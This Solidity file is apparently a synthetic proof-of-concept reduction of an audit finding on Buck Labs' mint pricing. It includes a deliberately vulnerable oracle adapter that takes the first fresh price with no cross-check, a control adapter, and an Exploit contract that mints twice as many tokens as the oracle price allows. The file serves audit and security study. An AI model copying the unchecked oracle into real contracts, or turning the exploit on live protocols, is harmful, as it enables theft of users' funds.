// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Buck Labs — mint pricing uses the view-only oracle path
    (Spearbit, January 2026, finding 64791).
    SYNTHETIC, cheatcode-free reduction.
    _fetchPriceView is the audited body: the first fresh oracle is returned
    with no cross-check against the second feed. Mint divides the USDC in
    by that price. Redstone is fresh at 1e18 while Pyth, the oracle price,
    is fresh at 2e18. 100 USDC mints 100 tokens. The oracle price allows 50.
    The control adapter returns the higher of the two fresh prices. */

contract Erc20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IOracle {
    function latestPrice() external view returns (uint256 price, uint256 updatedAt);
}

contract OracleAdapter {
    uint256 public redstonePrice;
    uint256 public pythPrice;
    uint256 public lastGoodPrice;
    uint256 public lastGoodPriceTime;

    constructor(uint256 redstone_, uint256 pyth_) {
        redstonePrice = redstone_;
        pythPrice = pyth_;
        lastGoodPrice = pyth_;
    }

    function latestPrice() external view returns (uint256 price, uint256 updatedAt) {
        return _fetchPriceView();
    }

    function _tryRedstone() internal view returns (uint256 price, uint256 updatedAt, bool fresh) {
        return (redstonePrice, block.timestamp, true); // @> VULN: first fresh oracle, no Pyth cross-check
    }

    function _tryPyth() internal view returns (uint256 price, uint256 updatedAt, bool fresh) {
        return (pythPrice, block.timestamp, true);
    }

    function _fetchPriceView() internal view returns (uint256 price, uint256 updatedAt) {
        (uint256 redstonePx, uint256 redstoneTime, bool redstoneFresh) = _tryRedstone();
        if (redstoneFresh) return (redstonePx, redstoneTime);
        (uint256 pythPx, uint256 pythTime, bool pythFresh) = _tryPyth();
        if (pythFresh) return (pythPx, pythTime);
        return (lastGoodPrice, lastGoodPriceTime);
    }
}

/// @dev Control. latestPrice is the higher of the two fresh feeds.
contract OracleAdapterChecked {
    uint256 public redstonePrice;
    uint256 public pythPrice;

    constructor(uint256 redstone_, uint256 pyth_) {
        redstonePrice = redstone_;
        pythPrice = pyth_;
    }

    function latestPrice() external view returns (uint256 price, uint256 updatedAt) {
        require(redstonePrice > 0 && pythPrice > 0, "FRESH");
        price = redstonePrice > pythPrice ? redstonePrice : pythPrice;
        updatedAt = block.timestamp;
    }
}

contract LiquidityWindow {
    Erc20 public usdc;
    Erc20 public cap;
    IOracle public oracle;

    constructor(Erc20 usdc_, Erc20 cap_, IOracle oracle_) {
        usdc = usdc_;
        cap = cap_;
        oracle = oracle_;
    }

    function mint(uint256 usdcIn) external returns (uint256 tokensOut) {
        (uint256 price,) = oracle.latestPrice();
        tokensOut = usdcIn * 1e18 / price;
        require(usdc.transferFrom(msg.sender, address(this), usdcIn), "PULL");
        cap.mint(msg.sender, tokensOut);
    }
}

contract Exploit {
    uint256 public constant USDC_IN = 100 ether;
    uint256 public constant REDSTONE = 1 ether;
    uint256 public constant PYTH = 2 ether;

    Erc20 public cap; // CREATE nonce 1
    Erc20 public usdc; // CREATE nonce 2
    OracleAdapter public oracle; // CREATE nonce 3
    LiquidityWindow public window; // CREATE nonce 4

    uint256 public minted;
    uint256 public allowed;

    constructor() {
        cap = new Erc20("Buck Cap", "CAP");
        usdc = new Erc20("USD Coin", "USDC");
        oracle = new OracleAdapter(REDSTONE, PYTH);
        window = new LiquidityWindow(usdc, cap, IOracle(address(oracle)));
    }

    function run() external {
        usdc.mint(address(this), USDC_IN);
        usdc.approve(address(window), USDC_IN);
        minted = window.mint(USDC_IN);
        allowed = USDC_IN * 1e18 / oracle.pythPrice();
        require(minted == 100 ether, "minted");
        require(allowed == 50 ether, "allowed");
        require(minted > allowed, "not more");
        require(cap.balanceOf(address(this)) == minted, "cap");
        cap.transfer(msg.sender, minted);
    }
}
